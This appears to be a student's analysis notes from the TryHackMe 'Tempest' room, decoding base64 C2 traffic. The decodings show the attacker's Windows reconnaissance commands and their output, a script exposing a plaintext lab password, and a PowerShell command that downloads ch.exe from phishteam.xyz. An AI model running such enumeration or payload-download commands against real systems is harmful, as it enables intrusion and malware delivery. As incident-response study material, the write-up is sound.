# Title: Malicious Strings

This is a set of malicious strings found in the C2 server from tempest room (TryHackMe).

A skeleton of **base64** encoded `commands` used by the **threat actor**.


## Document

This *document* has been created to reflect the analysis process from beforementioned task,
and to help better understand or analyse the threat actor actions.


### Body: - *Roadmap* - malicious commands:
______________________________________________________

#### 1st

`d2hvYW1pIC0gdGVtcGVzdFxiZW5pbWFydQ0K`


*decoded:*
`whoami - tempest\benimaru`


_______________________________________________________

#### 2nd

`cHdkIC0gDQpQYXRoICAgICAgICAgICAgICAgDQotLS0tICAgICAgICAgICAgICAgDQpDOlxXaW5kb3dzXHN5c3RlbTMyDQoNCg0K`


*decoded:*

```
pwd - 
Path               
----               
C:\Windows\system32


```
________________________________________________________

#### 3rd

`ZGlyIEM6XFVzZXJzIC0gDQoNCiAgICBEaXJlY3Rvcnk6IEM6XFVzZXJzDQoNCg0KTW9kZSAgICAgICAgICAgICAgICBMYXN0V3JpdGVUaW1lICAgICAgICAgTGVuZ3RoIE5hbWUgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQotLS0tICAgICAgICAgICAgICAgIC0tLS0tLS0tLS0tLS0gICAgICAgICAtLS0tLS0gLS0tLSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCmQtLS0tLSAgICAgICAgNi8yMC8yMDIyICAgOTowNiBQTSAgICAgICAgICAgICAgICBiZW5pbWFydSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KZC1yLS0tICAgICAgICA2LzIwLzIwMjIgICA0OjAzIFBNICAgICAgICAgICAgICAgIFB1YmxpYyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQpkLS0tLS0gICAgICAgIDYvMjAvMjAyMiAgMTE6NTIgUE0gICAgICAgICAgICAgICAgcmltdXJ1ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCg0KDQo=`

*decoded:*

```
dir C:\Users - 

    Directory: C:\Users


Mode                LastWriteTime         Length Name                                                                   
----                -------------         ------ ----                                                                   
d-----        6/20/2022   9:06 PM                benimaru                                                               
d-r---        6/20/2022   4:03 PM                Public                                                                 
d-----        6/20/2022  11:52 PM                rimuru                                                                 



```

_______________________________________________________

#### 4th



`bmV0IHVzZXJzIC0gDQpVc2VyIGFjY291bnRzIGZvciBcXFRFTVBFU1QNCg0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KQWRtaW5pc3RyYXRvciAgICAgICAgICAgIGJlbmltYXJ1ICAgICAgICAgICAgICAgICBEZWZhdWx0QWNjb3VudCAgICAgICAgICAgDQpHdWVzdCAgICAgICAgICAgICAgICAgICAgcmltdXJ1ICAgICAgICAgICAgICAgICAgIFdEQUdVdGlsaXR5QWNjb3VudCAgICAgICANClRoZSBjb21tYW5kIGNvbXBsZXRlZCBzdWNjZXNzZnVsbHkuDQoNCg==`

*decoded:*

```
net users - 
User accounts for \\TEMPEST

-------------------------------------------------------------------------------
Administrator            benimaru                 DefaultAccount           
Guest                    rimuru                   WDAGUtilityAccount       
The command completed successfully.



```


_______________________________________________________

#### 5th



`bmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnMgLSBBbGlhcyBuYW1lICAgICBhZG1pbmlzdHJhdG9ycw0KQ29tbWVudCAgICAgICAgQWRtaW5pc3RyYXRvcnMgaGF2ZSBjb21wbGV0ZSBhbmQgdW5yZXN0cmljdGVkIGFjY2VzcyB0byB0aGUgY29tcHV0ZXIvZG9tYWluDQoNCk1lbWJlcnMNCg0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KQWRtaW5pc3RyYXRvcg0KcmltdXJ1DQpUaGUgY29tbWFuZCBjb21wbGV0ZWQgc3VjY2Vzc2Z1bGx5Lg0KDQo=`




*decoded:*

```
net localgroup administrators - Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
rimuru
The command completed successfully.



```

_______________________________________________________

#### 6th


`bmV0IHVzZXIgYmVuaW1hcnUgLSBVc2VyIG5hbWUgICAgICAgICAgICAgICAgICAgIGJlbmltYXJ1DQpGdWxsIE5hbWUgICAgICAgICAgICAgICAgICAgIA0KQ29tbWVudCAgICAgICAgICAgICAgICAgICAgICANClVzZXIncyBjb21tZW50ICAgICAgICAgICAgICAgDQpDb3VudHJ5L3JlZ2lvbiBjb2RlICAgICAgICAgIDAwMCAoU3lzdGVtIERlZmF1bHQpDQpBY2NvdW50IGFjdGl2ZSAgICAgICAgICAgICAgIFllcw0KQWNjb3VudCBleHBpcmVzICAgICAgICAgICAgICBOZXZlcg0KDQpQYXNzd29yZCBsYXN0IHNldCAgICAgICAgICAgIDYvMjAvMjAyMiA5OjE4OjA0IFBNDQpQYXNzd29yZCBleHBpcmVzICAgICAgICAgICAgIE5ldmVyDQpQYXNzd29yZCBjaGFuZ2VhYmxlICAgICAgICAgIDYvMjAvMjAyMiA5OjE4OjA0IFBNDQpQYXNzd29yZCByZXF1aXJlZCAgICAgICAgICAgIE5vDQpVc2VyIG1heSBjaGFuZ2UgcGFzc3dvcmQgICAgIFllcw0KDQpXb3Jrc3RhdGlvbnMgYWxsb3dlZCAgICAgICAgIEFsbA0KTG9nb24gc2NyaXB0ICAgICAgICAgICAgICAgICANClVzZXIgcHJvZmlsZSAgICAgICAgICAgICAgICAgDQpIb21lIGRpcmVjdG9yeSAgICAgICAgICAgICAgIA0KTGFzdCBsb2dvbiAgICAgICAgICAgICAgICAgICA2LzIxLzIwMjIgMToxNDo0OSBBTQ0KDQpMb2dvbiBob3VycyBhbGxvd2VkICAgICAgICAgIEFsbA0KDQpMb2NhbCBHcm91cCBNZW1iZXJzaGlwcyAgICAgICpSZW1vdGUgTWFuYWdlbWVudCBVc2UqVXNlcnMgICAgICAgICAgICAgICAgDQpHbG9iYWwgR3JvdXAgbWVtYmVyc2hpcHMgICAgICpOb25lICAgICAgICAgICAgICAgICANClRoZSBjb21tYW5kIGNvbXBsZXRlZCBzdWNjZXNzZnVsbHkuDQoNCg==`




*decoded:*

```
net user benimaru - User name                    benimaru
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/20/2022 9:18:04 PM
Password expires             Never
Password changeable          6/20/2022 9:18:04 PM
Password required            No
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   6/21/2022 1:14:49 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use*Users                
Global Group memberships     *None                 
The command completed successfully.



```

______________________________________________________

#### 7th



`ZGlyIEM6XFVzZXJzXGJlbmltYXJ1IC0gDQoNCiAgICBEaXJlY3Rvcnk6IEM6XFVzZXJzXGJlbmltYXJ1DQoNCg0KTW9kZSAgICAgICAgICAgICAgICBMYXN0V3JpdGVUaW1lICAgICAgICAgTGVuZ3RoIE5hbWUgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQotLS0tICAgICAgICAgICAgICAgIC0tLS0tLS0tLS0tLS0gICAgICAgICAtLS0tLS0gLS0tLSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCmQtci0tLSAgICAgICAgNi8yMC8yMDIyICAgNDoxMyBQTSAgICAgICAgICAgICAgICAzRCBPYmplY3RzICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KZC1yLS0tICAgICAgICA2LzIwLzIwMjIgICA0OjEzIFBNICAgICAgICAgICAgICAgIENvbnRhY3RzICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQpkLXItLS0gICAgICAgIDYvMjEvMjAyMiAgMTI6MjcgQU0gICAgICAgICAgICAgICAgRGVza3RvcCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCmQtci0tLSAgICAgICAgNi8yMC8yMDIyICAgOToyMCBQTSAgICAgICAgICAgICAgICBEb2N1bWVudHMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KZC1yLS0tICAgICAgICA2LzIxLzIwMjIgICAxOjEzIEFNICAgICAgICAgICAgICAgIERvd25sb2FkcyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQpkLXItLS0gICAgICAgIDYvMjAvMjAyMiAgIDQ6MTMgUE0gICAgICAgICAgICAgICAgRmF2b3JpdGVzICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCmQtci0tLSAgICAgICAgNi8yMC8yMDIyICAgNDoxMyBQTSAgICAgICAgICAgICAgICBMaW5rcyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KZC1yLS0tICAgICAgICA2LzIwLzIwMjIgICA0OjEzIFBNICAgICAgICAgICAgICAgIE11c2ljICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQpkYXItLS0gICAgICAgIDYvMjEvMjAyMiAgIDE6MTUgQU0gICAgICAgICAgICAgICAgT25lRHJpdmUgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCmQtci0tLSAgICAgICAgNi8yMC8yMDIyICAgNDoxMyBQTSAgICAgICAgICAgICAgICBQaWN0dXJlcyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KZC1yLS0tICAgICAgICA2LzIwLzIwMjIgICA0OjEzIFBNICAgICAgICAgICAgICAgIFNhdmVkIEdhbWVzICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQpkLXItLS0gICAgICAgIDYvMjAvMjAyMiAgIDQ6MTMgUE0gICAgICAgICAgICAgICAgU2VhcmNoZXMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCmQtci0tLSAgICAgICAgNi8yMC8yMDIyICAgNTo1NyBQTSAgICAgICAgICAgICAgICBWaWRlb3MgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KDQoNCg==`


*decoded:*

```
dir C:\Users\benimaru - 

    Directory: C:\Users\benimaru


Mode                LastWriteTime         Length Name                                                                   
----                -------------         ------ ----                                                                   
d-r---        6/20/2022   4:13 PM                3D Objects                                                             
d-r---        6/20/2022   4:13 PM                Contacts                                                               
d-r---        6/21/2022  12:27 AM                Desktop                                                                
d-r---        6/20/2022   9:20 PM                Documents                                                              
d-r---        6/21/2022   1:13 AM                Downloads                                                              
d-r---        6/20/2022   4:13 PM                Favorites                                                              
d-r---        6/20/2022   4:13 PM                Links                                                                  
d-r---        6/20/2022   4:13 PM                Music                                                                  
dar---        6/21/2022   1:15 AM                OneDrive                                                               
d-r---        6/20/2022   4:13 PM                Pictures                                                               
d-r---        6/20/2022   4:13 PM                Saved Games                                                            
d-r---        6/20/2022   4:13 PM                Searches                                                               
d-r---        6/20/2022   5:57 PM                Videos                                                                 


```

_______________________________________________________

#### 8th



`ZGlyIEM6XFVzZXJzXGJlbmltYXJ1XGRvY3VtZW50cyAtIA==`

*decoded:*

```
dir C:\Users\benimaru\documents - 

```
________________________________________________________


#### 9th


`ZGlyIEM6XHVzZXJzXGJlbmltYXJ1XERlc2t0b3AgLSANCg0KICAgIERpcmVjdG9yeTogQzpcdXNlcnNcYmVuaW1hcnVcRGVza3RvcA0KDQoNCk1vZGUgICAgICAgICAgICAgICAgTGFzdFdyaXRlVGltZSAgICAgICAgIExlbmd0aCBOYW1lICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KLS0tLSAgICAgICAgICAgICAgICAtLS0tLS0tLS0tLS0tICAgICAgICAgLS0tLS0tIC0tLS0gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQotYS0tLS0gICAgICAgIDYvMjAvMjAyMiAgMTE6MzQgUE0gICAgICAgICAgICAyNjggYXV0b21hdGlvbi5wczEgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCi1hLS0tLSAgICAgICAgNi8yMC8yMDIyICAgNDoxMyBQTSAgICAgICAgICAgMTQ0NiBNaWNyb3NvZnQgRWRnZS5sbmsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KDQoNCg==`



*decoded:*

```
dir C:\users\benimaru\Desktop - 

    Directory: C:\users\benimaru\Desktop


Mode                LastWriteTime         Length Name                                                                   
----                -------------         ------ ----                                                                   
-a----        6/20/2022  11:34 PM            268 automation.ps1                                                         
-a----        6/20/2022   4:13 PM           1446 Microsoft Edge.lnk                                                     



```


________________________________________________________

#### 10th


`Y2F0IEM6XFVzZXJzXEJlbmltYXJ1XERlc2t0b3BcYXV0b21hdGlvbi5wczEgLSAkdXNlciA9ICJURU1QRVNUXGJlbmltYXJ1Ig0KJHBhc3MgPSAiaW5mZXJub3RlbXBlc3QiDQoNCiRzZWN1cmVQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJHBhc3MgLUFzUGxhaW5UZXh0IC1Gb3JjZTsNCiRjcmVkZW50aWFsID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCAkdXNlciwgJHNlY3VyZVBhc3N3b3JkDQoNCiMjIFRPRE86IEF1dG9tYXRlIGVhc3kgdGFza3MgdG8gaGFjayB3b3JraW5nIGhvdXJzDQo=`

*decoded:*

```
cat C:\Users\Benimaru\Desktop\automation.ps1 - $user = "TEMPEST\benimaru"
$pass = "infernotempest"

$securePassword = ConvertTo-SecureString $pass -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $user, $securePassword
```

## TODO: Automate easy tasks to hack working hours

________________________________________________________


#### 11th


`bmV0c3RhdCAtYW5vIC1wIHRjcCAtIA0KQWN0aXZlIENvbm5lY3Rpb25zDQoNCiAgUHJvdG8gIExvY2FsIEFkZHJlc3MgICAgICAgICAgRm9yZWlnbiBBZGRyZXNzICAgICAgICBTdGF0ZSAgICAgICAgICAgUElEDQogIFRDUCAgICAwLjAuMC4wOjEzNSAgICAgICAgICAgIDAuMC4wLjA6MCAgICAgICAgICAgICAgTElTVEVOSU5HICAgICAgIDg2NA0KICBUQ1AgICAgMC4wLjAuMDo0NDUgICAgICAgICAgICAwLjAuMC4wOjAgICAgICAgICAgICAgIExJU1RFTklORyAgICAgICA0DQogIFRDUCAgICAwLjAuMC4wOjUwNDAgICAgICAgICAgIDAuMC4wLjA6MCAgICAgICAgICAgICAgTElTVEVOSU5HICAgICAgIDU1MDgNCiAgVENQICAgIDAuMC4wLjA6NTM1NyAgICAgICAgICAgMC4wLjAuMDowICAgICAgICAgICAgICBMSVNURU5JTkcgICAgICAgNA0KICBUQ1AgICAgMC4wLjAuMDo1OTg1ICAgICAgICAgICAwLjAuMC4wOjAgICAgICAgICAgICAgIExJU1RFTklORyAgICAgICA0DQogIFRDUCAgICAwLjAuMC4wOjc2ODAgICAgICAgICAgIDAuMC4wLjA6MCAgICAgICAgICAgICAgTElTVEVOSU5HICAgICAgIDQ5NjQNCiAgVENQICAgIDAuMC4wLjA6NDcwMDEgICAgICAgICAgMC4wLjAuMDowICAgICAgICAgICAgICBMSVNURU5JTkcgICAgICAgNA0KICBUQ1AgICAgMC4wLjAuMDo0OTY2NCAgICAgICAgICAwLjAuMC4wOjAgICAgICAgICAgICAgIExJU1RFTklORyAgICAgICA0NzYNCiAgVENQICAgIDAuMC4wLjA6NDk2NjUgICAgICAgICAgMC4wLjAuMDowICAgICAgICAgICAgICBMSVNURU5JTkcgICAgICAgMTIxMg0KICBUQ1AgICAgMC4wLjAuMDo0OTY2NiAgICAgICAgICAwLjAuMC4wOjAgICAgICAgICAgICAgIExJU1RFTklORyAgICAgICAxNzYwDQogIFRDUCAgICAwLjAuMC4wOjQ5NjY3ICAgICAgICAgIDAuMC4wLjA6MCAgICAgICAgICAgICAgTElTVEVOSU5HICAgICAgIDI0MjQNCiAgVENQICAgIDAuMC4wLjA6NDk2NzEgICAgICAgICAgMC4wLjAuMDowICAgICAgICAgICAgICBMSVNURU5JTkcgICAgICAgNjI0DQogIFRDUCAgICAwLjAuMC4wOjQ5Njc2ICAgICAgICAgIDAuMC4wLjA6MCAgICAgICAgICAgICAgTElTVEVOSU5HICAgICAgIDYwOA0KICBUQ1AgICAgMTkyLjE2OC4yNTQuMTA3OjEzOSAgICAwLjAuMC4wOjAgICAgICAgICAgICAgIExJU1RFTklORyAgICAgICA0DQogIFRDUCAgICAxOTIuMTY4LjI1NC4xMDc6NTE4MDIgIDUyLjEzOS4yNTAuMjUzOjQ0MyAgICAgRVNUQUJMSVNIRUQgICAgIDMyMTYNCiAgVENQICAgIDE5Mi4xNjguMjU0LjEwNzo1MTgzOSAgMzQuMTA0LjM1LjEyMzo4MCAgICAgICBUSU1FX1dBSVQgICAgICAgMA0KICBUQ1AgICAgMTkyLjE2OC4yNTQuMTA3OjUxODU4ICAxMDQuMTAxLjIyLjEyODo4MCAgICAgIFRJTUVfV0FJVCAgICAgICAwDQogIFRDUCAgICAxOTIuMTY4LjI1NC4xMDc6NTE4NjAgIDIwLjIwNS4xNDYuMTQ5OjQ0MyAgICAgVElNRV9XQUlUICAgICAgIDANCiAgVENQICAgIDE5Mi4xNjguMjU0LjEwNzo1MTg2MSAgMjA0Ljc5LjE5Ny4yMDA6NDQzICAgICBFU1RBQkxJU0hFRCAgICAgNDM1Mg0KICBUQ1AgICAgMTkyLjE2OC4yNTQuMTA3OjUxODcxICAyMC4xOTAuMTQ0LjE2OTo0NDMgICAgIFRJTUVfV0FJVCAgICAgICAwDQogIFRDUCAgICAxOTIuMTY4LjI1NC4xMDc6NTE4NzYgIDUyLjE3OC4xNy4yOjQ0MyAgICAgICAgRVNUQUJMSVNIRUQgICAgIDQzODgNCiAgVENQICAgIDE5Mi4xNjguMjU0LjEwNzo1MTg3OCAgMjAuNjAuMTc4LjM2OjQ0MyAgICAgICBFU1RBQkxJU0hFRCAgICAgNDM4OA0KICBUQ1AgICAgMTkyLjE2OC4yNTQuMTA3OjUxODgxICA1Mi4xMDkuMTI0LjExNTo0NDMgICAgIEVTVEFCTElTSEVEICAgICA0Mzg4DQogIFRDUCAgICAxOTIuMTY4LjI1NC4xMDc6NTE4ODIgIDUyLjEzOS4xNTQuNTU6NDQzICAgICAgRVNUQUJMSVNIRUQgICAgIDQzODgNCiAgVENQICAgIDE5Mi4xNjguMjU0LjEwNzo1MTg4NCAgNDAuMTE5LjIxMS4yMDM6NDQzICAgICBFU1RBQkxJU0hFRCAgICAgNDM4OA0KICBUQ1AgICAgMTkyLjE2OC4yNTQuMTA3OjUxODk1ICA1Mi4xNTIuOTAuMTcyOjQ0MyAgICAgIEVTVEFCTElTSEVEICAgICA1NTA4DQogIFRDUCAgICAxOTIuMTY4LjI1NC4xMDc6NTE4OTYgIDIwLjQ0LjIyOS4xMTI6NDQzICAgICAgRVNUQUJMSVNIRUQgICAgIDg5MDQNCg==`



*decoded:*


```

netstat -ano -p tcp - 
Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       864
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       5508
  TCP    0.0.0.0:5357           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:7680           0.0.0.0:0              LISTENING       4964
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       476
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1212
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1760
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       2424
  TCP    0.0.0.0:49671          0.0.0.0:0              LISTENING       624
  TCP    0.0.0.0:49676          0.0.0.0:0              LISTENING       608
  TCP    192.168.254.107:139    0.0.0.0:0              LISTENING       4
  TCP    192.168.254.107:51802  52.139.250.253:443     ESTABLISHED     3216
  TCP    192.168.254.107:51839  34.104.35.123:80       TIME_WAIT       0
  TCP    192.168.254.107:51858  104.101.22.128:80      TIME_WAIT       0
  TCP    192.168.254.107:51860  20.205.146.149:443     TIME_WAIT       0
  TCP    192.168.254.107:51861  204.79.197.200:443     ESTABLISHED     4352
  TCP    192.168.254.107:51871  20.190.144.169:443     TIME_WAIT       0
  TCP    192.168.254.107:51876  52.178.17.2:443        ESTABLISHED     4388
  TCP    192.168.254.107:51878  20.60.178.36:443       ESTABLISHED     4388
  TCP    192.168.254.107:51881  52.109.124.115:443     ESTABLISHED     4388
  TCP    192.168.254.107:51882  52.139.154.55:443      ESTABLISHED     4388
  TCP    192.168.254.107:51884  40.119.211.203:443     ESTABLISHED     4388
  TCP    192.168.254.107:51895  52.152.90.172:443      ESTABLISHED     5508
  TCP    192.168.254.107:51896  20.44.229.112:443      ESTABLISHED     8904

```

____________________________________________________________________________

#### 12th


`cG93ZXJzaGVsbCBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy9jaC5leGUgLW91dGZpbGUgQzpcVXNlcnNcYmVuaW1hcnVcRG93bmxvYWRzXGNoLmV4ZSAtIA==`


*decoded:*

```
powershell iwr http://phishteam.xyz/02dcf07/ch.exe -outfile C:\Users\benimaru\Downloads\ch.exe - 

```

_______________________________________________________________________________

#### 13th


`ZGlyIEM6XFVzZXJzXGJlbmltYXJ1XERvd25sb2Fkc1xjaC5leGUgLSANCg0KICAgIERpcmVjdG9yeTogQzpcVXNlcnNcYmVuaW1hcnVcRG93bmxvYWRzDQoNCg0KTW9kZSAgICAgICAgICAgICAgICBMYXN0V3JpdGVUaW1lICAgICAgICAgTGVuZ3RoIE5hbWUgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQotLS0tICAgICAgICAgICAgICAgIC0tLS0tLS0tLS0tLS0gICAgICAgICAtLS0tLS0gLS0tLSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCi1hLS0tLSAgICAgICAgNi8yMS8yMDIyICAgMToxNyBBTSAgICAgICAgODIzMDkxMiBjaC5leGUgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KDQoNCg==`


*decoded:*

```
dir C:\Users\benimaru\Downloads\ch.exe - 

    Directory: C:\Users\benimaru\Downloads


Mode                LastWriteTime         Length Name                                                                   
----                -------------         ------ ----                                                                   
-a----        6/21/2022   1:17 AM        8230912 ch.exe                                                                 


```

